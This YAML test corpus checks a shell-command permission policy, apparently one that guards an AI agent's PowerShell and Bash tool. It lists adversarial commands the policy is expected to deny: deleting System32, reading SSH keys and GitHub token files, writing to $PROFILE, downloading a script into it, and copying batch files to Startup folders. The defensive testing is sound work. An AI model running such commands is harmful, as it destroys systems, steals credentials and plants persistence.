# End-to-end corpus: review fixes of M1b for event.py / paths.py (PowerShell tool, DEFAULT policy).
# Windows host only (real parser helper). Fake machine: home C:\Users\testuser, project
# C:\Users\testuser\proj. `adv: true` entries must never come out milder than `expect`.

# ---- $PWD follows Set-Location ------------------------------------------------------------------
- {id: psrev-pwd-after-cd-system32, tool: PowerShell, platform: windows, input: {command: 'Set-Location C:\Windows; Remove-Item -Recurse -Force $PWD\System32'}, expect: deny, adv: true}
- {id: psrev-pwd-after-cd-config, tool: PowerShell, platform: windows, input: {command: 'Set-Location ~\.config; gc $PWD\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-pwd-quoted-after-cd, tool: PowerShell, platform: windows, input: {command: 'Set-Location ~\.config; gc "$PWD\gh\hosts.yml"'}, expect: deny, adv: true}
- {id: psrev-pwd-brace-after-cd, tool: PowerShell, platform: windows, input: {command: 'Set-Location ~\.config; gc ${PWD}\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-pwd-lower-after-cd, tool: PowerShell, platform: windows, input: {command: 'sl ~\.config; gc $pwd\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-bash-pwd-after-cd, tool: Bash, input: {command: 'cd ~/.config; cat $PWD/gh/hosts.yml'}, expect: deny, adv: true}
- {id: psrev-bash-pwd-brace-after-cd, tool: Bash, input: {command: 'cd ~/.config; cat ${PWD}/gh/hosts.yml'}, expect: deny, adv: true}

# ---- known PowerShell variables are not dynamic ----------------------------------------------------
- {id: psrev-env-var-credential, tool: PowerShell, platform: windows, input: {command: 'gc $env:USERPROFILE\.config\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-env-var-brace-credential, tool: PowerShell, platform: windows, input: {command: 'gc ${env:USERPROFILE}\.config\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-env-var-lower-credential, tool: PowerShell, platform: windows, input: {command: 'gc $ENV:userprofile\.config\gh\hosts.yml'}, expect: deny, adv: true}
- {id: psrev-home-var-mixed-case, tool: PowerShell, platform: windows, input: {command: 'gc $Home\.ssh\id_rsa'}, expect: deny, adv: true}
- {id: psrev-env-var-quoted, tool: PowerShell, platform: windows, input: {command: 'gc "$env:USERPROFILE\.ssh\id_rsa"'}, expect: deny, adv: true}
- {id: psrev-env-var-inside-project, tool: PowerShell, platform: windows, input: {command: 'Remove-Item -Recurse $env:USERPROFILE\proj\build'}, expect: gray}
- {id: psrev-home-var-inside-project, tool: PowerShell, platform: windows, input: {command: 'Remove-Item -Recurse $Home\proj\build'}, expect: gray}
- {id: psrev-env-unknown-var, tool: PowerShell, platform: windows, input: {command: 'Remove-Item -Recurse -Force $env:NOSUCHVAR\x'}, expect: deny, adv: true}

# ---- $PROFILE and startup folders ------------------------------------------------------------------
- {id: psrev-profile-add-content, tool: PowerShell, platform: windows, input: {command: 'Add-Content $PROFILE "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
- {id: psrev-profile-lower, tool: PowerShell, platform: windows, input: {command: 'Add-Content $profile "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
- {id: psrev-profile-quoted, tool: PowerShell, platform: windows, input: {command: 'Set-Content "$PROFILE" "x"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
- {id: psrev-profile-outfile, tool: PowerShell, platform: windows, input: {command: 'Invoke-WebRequest https://example.com/p.ps1 -OutFile $PROFILE'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
- {id: psrev-programdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
- {id: psrev-appdata-startup, tool: PowerShell, platform: windows, input: {command: 'Copy-Item a.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"'}, expect: deny, adv: true}  # deny since the rules after M2 (M2-rules-3)
